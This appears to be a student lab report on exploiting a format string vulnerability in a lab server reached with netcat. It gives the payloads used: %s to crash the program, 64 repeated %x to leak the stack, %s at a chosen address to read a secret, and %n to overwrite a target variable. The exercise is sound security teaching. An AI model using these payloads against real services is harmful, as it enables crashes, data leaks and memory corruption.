# Task 1

We used the "%s" format specifier to force the program to interpret a value as an address which was not valid, thus crashing the program.

Command used:
``` bash
echo %s | nc 10.9.0.5 9090
```

# Task 2
From now on we used build_string.py to construct the attack string and inputed it with the following command:
``` bash
cat badfile | nc 10.9.0.5 9090
```

## 2.a

Through trial and error we found that we needed to use "%x" 64 times until the last value to be printed was the one specified in the first 4 bytes of our input.

String s was constructed with:
``` py
s = "\n" + "0x%.8x\n" * 64
```

## 2.b

To print the secret message we discovered the memory position at which the message was being stored through the program's own printout (0x080b4008).
We changed the first 4 bytes of the input to this value and the 64th "%x" to "%s" so printf() would print the string stored at this position.

String s was contructed with:
```py
s = "\n" + "0x%.8x\n" * 63 + "%s\n"
```

The secret message was:
```
A secret message
```

# Task 3

## 3.a

We used the program's output to find the memory position of the target variable (0x080e5068). We changed the first 4 bytes of the input to this value and changed "%s" to  "%n" to store the number of characters printed so far at that value, changing it.

String s was contructed with:
```py
s = "\n" + "0x%.8x\n" * 63 + "%n\n"
```

## 3.b

To change the value stored in the target value we just needed to change the amount of characters printed before using "%n".

String s was constructed with:
```py
s = "\n" + "0x%.322x\n" * 63 + "%n\n"
```
